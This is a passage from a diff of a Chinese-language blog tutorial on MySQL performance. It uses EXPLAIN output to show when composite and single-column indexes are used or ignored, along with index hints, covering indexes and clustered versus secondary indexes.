class="comment">---------+------------+----------------------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+---------+------------+</span></span><br><span class="line"><span class="operator">|</span> tb_user <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span> <span class="keyword">PRIMARY</span>              <span class="operator">|</span>            <span class="number">1</span> <span class="operator">|</span> id          <span class="operator">|</span> A         <span class="operator">|</span>      <span class="number">245768</span> <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>   <span class="keyword">NULL</span> <span class="operator">|</span>      <span class="operator">|</span> BTREE      <span class="operator">|</span>         <span class="operator">|</span>               <span class="operator">|</span> YES     <span class="operator">|</span> <span class="keyword">NULL</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> tb_user <span class="operator">|</span>          <span class="number">1</span> <span class="operator">|</span> idx_user_name        <span class="operator">|</span>            <span class="number">1</span> <span class="operator">|</span> name        <span class="operator">|</span> A         <span class="operator">|</span>      <span class="number">269997</span> <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>   <span class="keyword">NULL</span> <span class="operator">|</span> YES  <span class="operator">|</span> BTREE      <span class="operator">|</span>         <span class="operator">|</span>               <span class="operator">|</span> YES     <span class="operator">|</span> <span class="keyword">NULL</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> tb_user <span class="operator">|</span>          <span class="number">1</span> <span class="operator">|</span> idx_user_pro_age_sta <span class="operator">|</span>            <span class="number">1</span> <span class="operator">|</span> profession  <span class="operator">|</span> A         <span class="operator">|</span>           <span class="number">3</span> <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>   <span class="keyword">NULL</span> <span class="operator">|</span> YES  <span class="operator">|</span> BTREE      <span class="operator">|</span>         <span class="operator">|</span>               <span class="operator">|</span> YES     <span class="operator">|</span> <span class="keyword">NULL</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> tb_user <span class="operator">|</span>          <span class="number">1</span> <span class="operator">|</span> idx_user_pro_age_sta <span class="operator">|</span>            <span class="number">2</span> <span class="operator">|</span> age         <span class="operator">|</span> A         <span class="operator">|</span>         <span class="number">535</span> <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>   <span class="keyword">NULL</span> <span class="operator">|</span> YES  <span class="operator">|</span> BTREE      <span class="operator">|</span>         <span class="operator">|</span>               <span class="operator">|</span> YES     <span class="operator">|</span> <span class="keyword">NULL</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> tb_user <span class="operator">|</span>          <span class="number">1</span> <span class="operator">|</span> idx_user_pro_age_sta <span class="operator">|</span>            <span class="number">3</span> <span class="operator">|</span> status      <span class="operator">|</span> A         <span class="operator">|</span>        <span class="number">1051</span> <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>   <span class="keyword">NULL</span> <span class="operator">|</span> YES  <span class="operator">|</span> BTREE      <span class="operator">|</span>         <span class="operator">|</span>               <span class="operator">|</span> YES     <span class="operator">|</span> <span class="keyword">NULL</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> tb_user <span class="operator">|</span>          <span class="number">1</span> <span class="operator">|</span> idx_user_phone       <span class="operator">|</span>            <span class="number">1</span> <span class="operator">|</span> phone       <span class="operator">|</span> A         <span class="operator">|</span>      <span class="number">271498</span> <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>   <span class="keyword">NULL</span> <span class="operator">|</span> YES  <span class="operator">|</span> BTREE      <span class="operator">|</span>         <span class="operator">|</span>               <span class="operator">|</span> YES     <span class="operator">|</span> <span class="keyword">NULL</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> tb_user <span class="operator">|</span>          <span class="number">1</span> <span class="operator">|</span> idx_user_email       <span class="operator">|</span>            <span class="number">1</span> <span class="operator">|</span> email       <span class="operator">|</span> A         <span class="operator">|</span>      <span class="number">269341</span> <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>   <span class="keyword">NULL</span> <span class="operator">|</span> YES  <span class="operator">|</span> BTREE      <span class="operator">|</span>         <span class="operator">|</span>               <span class="operator">|</span> YES     <span class="operator">|</span> <span class="keyword">NULL</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+------------+----------------------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+---------+------------+</span></span><br></pre></td></tr></table></figure>
+<p>例: 符合最左前缀法则，走联合索引(profession,age,status)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select * from tb_user where profession = &#x27;R&amp;D&#x27; and age = 31 and status = 1;</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------------------+------+----------+-------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys        | key                  | key_len | ref               | rows | filtered | Extra |</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------------------+------+----------+-------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ref  | idx_user_pro_age_sta | idx_user_pro_age_sta | 154     | const,const,const |  261 |   100.00 | NULL  |</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------------------+------+----------+-------+</span><br></pre></td></tr></table></figure>
+<p>例：查询条件改成只有profession，仍然走联合索引(profession,age,status)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select * from tb_user where profession = &#x27;R&amp;D&#x27;;</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------+--------+----------+-------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys        | key                  | key_len | ref   | rows   | filtered | Extra |</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------+--------+----------+-------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ref  | idx_user_pro_age_sta | idx_user_pro_age_sta | 147     | const | 127438 |   100.00 | NULL  |</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------+--------+----------+-------+</span><br></pre></td></tr></table></figure>
+<p>例：查询条件改成age, status，索引失效，走了全表扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select * from tb_user where age = 31 and status = 1;</span><br><span class="line">+----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+-------------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys | key  | key_len | ref  | rows   | filtered | Extra       |</span><br><span class="line">+----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+-------------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ALL  | NULL          | NULL | NULL    | NULL | 271498 |     1.00 | Using where |</span><br><span class="line">+----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+-------------+</span><br></pre></td></tr></table></figure>
+<p>例：查询条件改成profession, status，索引部分失效，只有profession走了索引</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select * from tb_user where profession = &#x27;R&amp;D&#x27; and status = 1;</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------+--------+----------+-----------------------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys        | key                  | key_len | ref   | rows   | filtered | Extra                 |</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------+--------+----------+-----------------------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ref  | idx_user_pro_age_sta | idx_user_pro_age_sta | 147     | const | 127438 |    10.00 | Using index condition |</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------+--------+----------+-----------------------+</span><br></pre></td></tr></table></figure>
+<p>例：查询条件改成age, status, profession, 走联合索引(profession,age,status) (只要存在即可，和语句中的先后位置无关)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">explain select * from tb_user where age = 31 and status = 1 and profession = &#x27;R&amp;D&#x27;;</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------------------+------+----------+-------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys        | key                  | key_len | ref               | rows | filtered | Extra |</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------------------+------+----------+-------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ref  | idx_user_pro_age_sta | idx_user_pro_age_sta | 154     | const,const,const |  261 |   100.00 | NULL  |</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------------------+------+----------+-------+</span><br></pre></td></tr></table></figure>
+
+<h3 id="范围查询"><a href="#范围查询" class="headerlink" title="范围查询"></a>范围查询</h3><p>联合索引中，出现范围查询，则范围查询右侧的列索引失效</p>
+<p>例: age使用了范围查询，status没有走索引</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select * from tb_user where profession = &#x27;软件工程&#x27; and age &gt; 30 and status = &#x27;0&#x27;;</span><br><span class="line">+----+-------------+---------+------------+-------+----------------------+----------------------+---------+------+------+----------+-----------------------+</span><br><span class="line">| id | select_type | table   | partitions | type  | possible_keys        | key                  | key_len | ref  | rows | filtered | Extra                 |</span><br><span class="line">+----+-------------+---------+------------+-------+----------------------+----------------------+---------+------+------+----------+-----------------------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | range | idx_user_pro_age_sta | idx_user_pro_age_sta | 149     | NULL |    1 |    10.00 | Using index condition |</span><br><span class="line">+----+-------------+---------+------------+-------+----------------------+----------------------+---------+------+------+----------+-----------------------+</span><br></pre></td></tr></table></figure>
+<p>例：把 age &gt; 30 改成 age &gt;&#x3D; 30，都可以走索引 (业务允许情况下，尽量用&gt;&#x3D;代替&gt;)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select * from tb_user where profession = &#x27;软件工程&#x27; and age &gt;= 30 and status = &#x27;0&#x27;;</span><br><span class="line">+----+-------------+---------+------------+-------+----------------------+----------------------+---------+------+------+----------+-----------------------+</span><br><span class="line">| id | select_type | table   | partitions | type  | possible_keys        | key                  | key_len | ref  | rows | filtered | Extra                 |</span><br><span class="line">+----+-------------+---------+------------+-------+----------------------+----------------------+---------+------+------+----------+-----------------------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | range | idx_user_pro_age_sta | idx_user_pro_age_sta | 154     | NULL |    1 |    10.00 | Using index condition |</span><br><span class="line">+----+-------------+---------+------------+-------+----------------------+----------------------+---------+------+------+----------+-----------------------+</span><br></pre></td></tr></table></figure>
+
+<h3 id="在索引列上进行运算，索引会失效"><a href="#在索引列上进行运算，索引会失效" class="headerlink" title="在索引列上进行运算，索引会失效"></a>在索引列上进行运算，索引会失效</h3><p>例: 对phone做substring运算，发现索引失效, type &#x3D; ALL</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select * from tb_user where phone = &#x27;10931949622&#x27;;</span><br><span class="line">+----+-------------+---------+------------+------+----------------+----------------+---------+-------+------+----------+-----------------------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys  | key            | key_len | ref   | rows | filtered | Extra                 |</span><br><span class="line">+----+-------------+---------+------------+------+----------------+----------------+---------+-------+------+----------+-----------------------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ref  | idx_user_phone | idx_user_phone | 45      | const |    1 |   100.00 | Using index condition |</span><br><span class="line">+----+-------------+---------+------------+------+----------------+----------------+---------+-------+------+----------+-----------------------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; explain select * from tb_user where substring(phone,10,2) = &#x27;22&#x27;;</span><br><span class="line">+----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+-------------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys | key  | key_len | ref  | rows   | filtered | Extra       |</span><br><span class="line">+----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+-------------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ALL  | NULL          | NULL | NULL    | NULL | 271498 |   100.00 | Using where |</span><br><span class="line">+----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+-------------+</span><br></pre></td></tr></table></figure>
+
+<h3 id="字符串不加引号"><a href="#字符串不加引号" class="headerlink" title="字符串不加引号"></a>字符串不加引号</h3><p>字符串类型字段使用时，不加引号，索引将失效。</p>
+<p>例：查询手机号时，忘了加引号，也能查出结果，但索引失效</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select * from tb_user where phone = 10931949622;</span><br><span class="line">+----+-------------+---------+------------+------+----------------+------+---------+------+--------+----------+-------------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys  | key  | key_len | ref  | rows   | filtered | Extra       |</span><br><span class="line">+----+-------------+---------+------------+------+----------------+------+---------+------+--------+----------+-------------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ALL  | idx_user_phone | NULL | NULL    | NULL | 271498 |    10.00 | Using where |</span><br><span class="line">+----+-------------+---------+------------+------+----------------+------+---------+------+--------+----------+-------------+</span><br></pre></td></tr></table></figure>
+
+<h3 id="头部模糊匹配，索引失效"><a href="#头部模糊匹配，索引失效" class="headerlink" title="头部模糊匹配，索引失效"></a>头部模糊匹配，索引失效</h3><p>例: like查询手机号。使用头部模糊匹配’%262’，索引失效；尾部模糊匹配’109%’，索引有效</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select * from tb_user where phone like &#x27;109%&#x27;;</span><br><span class="line">+----+-------------+---------+------------+-------+----------------+----------------+---------+------+------+----------+-----------------------+</span><br><span class="line">| id | select_type | table   | partitions | type  | possible_keys  | key            | key_len | ref  | rows | filtered | Extra                 |</span><br><span class="line">+----+-------------+---------+------------+-------+----------------+----------------+---------+------+------+----------+-----------------------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | range | idx_user_phone | idx_user_phone | 45      | NULL | 2713 |   100.00 | Using index condition |</span><br><span class="line">+----+-------------+---------+------------+-------+----------------+----------------+---------+------+------+----------+-----------------------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; explain select * from tb_user where phone like &#x27;%622&#x27;;</span><br><span class="line">+----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+-------------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys | key  | key_len | ref  | rows   | filtered | Extra       |</span><br><span class="line">+----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+-------------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ALL  | NULL          | NULL | NULL    | NULL | 271498 |    11.11 | Using where |</span><br><span class="line">+----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+-------------+</span><br></pre></td></tr></table></figure>
+
+<h3 id="or连接的条件"><a href="#or连接的条件" class="headerlink" title="or连接的条件"></a>or连接的条件</h3><p>用or分割开的条件，如果or前条件中列有索引，or后条件没有索引，查询不会走索引</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select * from tb_user where phone = &#x27;10931949622&#x27; or age = 23;</span><br><span class="line">+----+-------------+---------+------------+------+----------------+------+---------+------+--------+----------+-------------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys  | key  | key_len | ref  | rows   | filtered | Extra       |</span><br><span class="line">+----+-------------+---------+------------+------+----------------+------+---------+------+--------+----------+-------------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ALL  | idx_user_phone | NULL | NULL    | NULL | 271498 |    10.00 | Using where |</span><br><span class="line">+----+-------------+---------+------------+------+----------------+------+---------+------+--------+----------+-------------+</span><br></pre></td></tr></table></figure>
+
+<h3 id="数据分布情况也会影响是否使用索引"><a href="#数据分布情况也会影响是否使用索引" class="headerlink" title="数据分布情况也会影响是否使用索引"></a>数据分布情况也会影响是否使用索引</h3><p>如果MySQL评估使用索引比全表更慢，则不使用索引</p>
+<p>例: tb_user表数据profression都是not null的，使用where is not null查询没有走索引</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select * from tb_user where profession is not null ;</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+------+---------+------+--------+----------+-------------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys        | key  | key_len | ref  | rows   | filtered | Extra       |</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+------+---------+------+--------+----------+-------------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ALL  | idx_user_pro_age_sta | NULL | NULL    | NULL | 271498 |    50.00 | Using where |</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+------+---------+------+--------+----------+-------------+</span><br></pre></td></tr></table></figure>
+
+<h3 id="索引提示"><a href="#索引提示" class="headerlink" title="索引提示"></a>索引提示</h3><p>SQL提示，是优化数据库的重要手段。指在SQL语句中加入一些认为提示来达到优化操作的目的。</p>
+<p>例：先创建一个profession单列索引</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create index idx_user_pro on tb_user(profession);</span><br></pre></td></tr></table></figure>
+<p>再查询profession为’R&amp;D’的员工。MySQL可以用普通索引idx_user_pro，也可以用联合索引idx_user_pro_age_sta</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select * from tb_user where profession = &#x27;R&amp;D&#x27;;</span><br><span class="line">+----+-------------+---------+------------+------+-----------------------------------+----------------------+---------+-------+--------+----------+-------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys                     | key                  | key_len | ref   | rows   | filtered | Extra |</span><br><span class="line">+----+-------------+---------+------------+------+-----------------------------------+----------------------+---------+-------+--------+----------+-------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ref  | idx_user_pro_age_sta,idx_user_pro | idx_user_pro_age_sta | 147     | const | 127438 |   100.00 | NULL  |</span><br><span class="line">+----+-------------+---------+------------+------+-----------------------------------+----------------------+---------+-------+--------+----------+-------+</span><br></pre></td></tr></table></figure>
+
+<p>use index (建议使用索引)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select * from tb_user use index(idx_user_pro) where profession = &#x27;R&amp;D&#x27;;</span><br><span class="line">+----+-------------+---------+------------+------+---------------+--------------+---------+-------+--------+----------+-------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys | key          | key_len | ref   | rows   | filtered | Extra |</span><br><span class="line">+----+-------------+---------+------------+------+---------------+--------------+---------+-------+--------+----------+-------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ref  | idx_user_pro  | idx_user_pro | 147     | const | 127772 |   100.00 | NULL  |</span><br><span class="line">+----+-------------+---------+------------+------+---------------+--------------+---------+-------+--------+----------+-------+</span><br></pre></td></tr></table></figure>
+<p>ignore index</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select * from tb_user ignore index(idx_user_pro) where profession = &#x27;R&amp;D&#x27;;</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------+--------+----------+-------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys        | key                  | key_len | ref   | rows   | filtered | Extra |</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------+--------+----------+-------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ref  | idx_user_pro_age_sta | idx_user_pro_age_sta | 147     | const | 127438 |   100.00 | NULL  |</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------+--------+----------+-------+</span><br></pre></td></tr></table></figure>
+<p>force index (强制使用索引)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select * from tb_user force index(idx_user_pro) where profession = &#x27;R&amp;D&#x27;;</span><br><span class="line">+----+-------------+---------+------------+------+---------------+--------------+---------+-------+-------+----------+-------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys | key          | key_len | ref   | rows  | filtered | Extra |</span><br><span class="line">+----+-------------+---------+------------+------+---------------+--------------+---------+-------+-------+----------+-------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ref  | idx_user_pro  | idx_user_pro | 147     | const | 90499 |   100.00 | NULL  |</span><br><span class="line">+----+-------------+---------+------------+------+---------------+--------------+---------+-------+-------+----------+-------+</span><br></pre></td></tr></table></figure>
+
+<h3 id="覆盖索引"><a href="#覆盖索引" class="headerlink" title="覆盖索引"></a>覆盖索引</h3><p>查询使用到了索引，并且查询的所有列，在该索引中已经全部能够找到(不需要回表)</p>
+<p>例: tb_user表已有联合索引(profession,age,status), 查询所有列在该索引中能找到时, Extra&#x3D;’Using index’，当查询字段新增name时，Extra&#x3D;’NULL’</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select id,profession,age,status from tb_user where profession = &#x27;R&amp;D&#x27;  and age = 31 and status = &#x27;0&#x27;;</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------------------+------+----------+-------------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys        | key                  | key_len | ref               | rows | filtered | Extra       |</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------------------+------+----------+-------------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ref  | idx_user_pro_age_sta | idx_user_pro_age_sta | 154     | const,const,const |  249 |   100.00 | Using index |</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------------------+------+----------+-------------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; explain select id,profession,age,status,name from tb_user where profession = &#x27;R&amp;D&#x27;  and age = 31 and status = &#x27;0&#x27;;</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------------------+------+----------+-------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys        | key                  | key_len | ref               | rows | filtered | Extra |</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------------------+------+----------+-------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ref  | idx_user_pro_age_sta | idx_user_pro_age_sta | 154     | const,const,const |  249 |   100.00 | NULL  |</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------------------+------+----------+-------+</span><br></pre></td></tr></table></figure>
+<p>注:</p>
+<ul>
+<li>using index condition (查找使用了索引，但需要回表)</li>
+<li>using where; using index; (查找使用了索引，且需要数据都能在索引列中找到，无需回表)</li>
+</ul>
+<p><strong>聚集索引和辅助索引</strong><br><img data-src="/2024/10/16/2024-10-16-mysql-advance/mysql-cluster-index.png"><br>注：</p>
+<ul>
+<li>聚集索引</li>
+<li>辅助索引 叶子节点存主键ID (聚集索引叶子节点已经存储行数据，没必要每个辅助索引也存一份行数据，只存主键ID节省空间)</li>
+</ul>
+<!-- https://www.bilibili.com/video/BV1Kr4y1i7ru?spm_id_from=333.788.player.switch&vd_source=d8559c2d87607be86810cd806158bb86&p=85 -->
 
 <h2 id="查看MySQL版本"><a href="#查看MySQL版本" class="headerlink" title="查看MySQL版本"></a>查看MySQL版本</h2><p><a href="https://github.com/mysql/mysql-server/releases/tag/mysql-8.0.36">https://github.com/mysql/mysql-server/releases/tag/mysql-8.0.36</a></p>
 <h2 id="进程模型"><a href="#进程模型" class="headerlink" title="进程模型"></a>进程模型</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl cat mysqld | grep ExecStart=</span><br><span class="line">ExecStart=/usr/libexec/mysqld --basedir=/usr</span><br></pre></td></tr></table></figure>
